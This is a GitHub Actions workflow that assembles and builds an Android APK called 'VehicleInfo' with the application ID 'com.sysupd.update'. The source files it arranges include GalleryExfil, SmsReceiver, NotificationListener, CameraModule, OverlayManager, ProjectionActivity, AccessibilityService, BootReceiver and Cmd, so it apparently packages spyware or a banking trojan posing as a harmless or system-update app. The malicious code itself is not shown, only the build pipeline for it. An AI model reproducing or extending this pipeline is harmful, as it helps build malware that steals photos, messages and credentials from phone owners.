name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Download Gradle 8.7
        run: |
          cd /tmp
          wget -q https://services.gradle.org/distributions/gradle-8.7-bin.zip
          unzip -q gradle-8.7-bin.zip
          echo "/tmp/gradle-8.7/bin" >> $GITHUB_PATH
          /tmp/gradle-8.7/bin/gradle --version

      - name: Rearrange files
        run: |
          set -e
          mkdir -p app/src/main/java/com/sysupd
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/mipmap-hdpi

          for f in AccessibilityService BootReceiver CameraModule Cmd Core \
                   ForegroundService GalleryExfil MainActivity NotificationListener \
                   OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
            if [ -f "$f.java" ]; then mv "$f.java" app/src/main/java/com/sysupd/; fi
          done

          [ -f activity_main.xml ] && mv activity_main.xml app/src/main/res/layout/
          [ -f activity_success.xml ] && mv activity_success.xml app/src/main/res/layout/
          [ -f colors.xml ] && mv colors.xml app/src/main/res/values/
          [ -f strings.xml ] && mv strings.xml app/src/main/res/values/
          [ -f themes.xml ] && mv themes.xml app/src/main/res/values/
          [ -f accessibility_config.xml ] && mv accessibility_config.xml app/src/main/res/xml/
          [ -f ic_launcher.png ] && mv ic_launcher.png app/src/main/res/mipmap-hdpi/
          [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
          [ -f google-services.json ] && mv google-services.json app/
          rm -f build.gradle

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.5.0'
                  classpath 'com.google.gms:google-services:4.4.0'
              }
          }
          allprojects {
              repositories { google(); mavenCentral() }
          }
          EOF

          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
              id 'com.google.gms.google-services'
          }
          android {
              namespace 'com.sysupd'
              compileSdk 34
              defaultConfig {
                  applicationId "com.sysupd.update"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
          }
          EOF

          cat > settings.gradle << 'EOF'
          rootProject.name = "VehicleInfo"
          include ':app'
          EOF

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties

      - name: Build APK
        run: gradle assembleDebug --no-daemon --stacktrace

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: vehicleinfo-apk
          path: app/build/outputs/apk/debug/app-debug.apk
